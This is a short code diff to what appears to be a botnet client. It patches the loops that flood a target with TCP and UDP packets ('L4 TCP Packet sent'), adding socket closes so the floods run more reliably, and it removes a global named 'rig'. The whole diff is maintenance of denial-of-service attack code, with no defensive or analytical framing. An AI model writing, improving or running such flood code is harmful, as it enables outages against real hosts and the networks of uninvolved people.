@@ -41,7 +41,7 @@ def task_exists(name):
 
 
 def client():
-    global l4_tcp_flag, l4_udp_flag, rig
+    global l4_tcp_flag, l4_udp_flag
 
     try:
         c = socket.socket()
@@ -107,6 +107,7 @@ def client():
                             l4_tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                             l4_tcp_sock.connect((l4_tcp_ip, l4_tcp_port))
                             l4_tcp_sock.send(l4_tcp_bytes)
+                            l4_tcp_sock.close()
 
                             print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {l4_tcp_ip}:{l4_tcp_port}")
 
@@ -142,8 +143,8 @@ def client():
                     while not l4_udp_flag.is_set():
                         try:
                             l4_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
                             l4_udp_socket.sendto(l4_udp_bytes, l4_udp_address)
+                            l4_udp_socket.close()
 
                             if l4_udp_port == 0:
                                 print("\033[32m[+]\033[0m L4 UDP Packet sent \033[31m->\033[0m", l4_udp_ip)
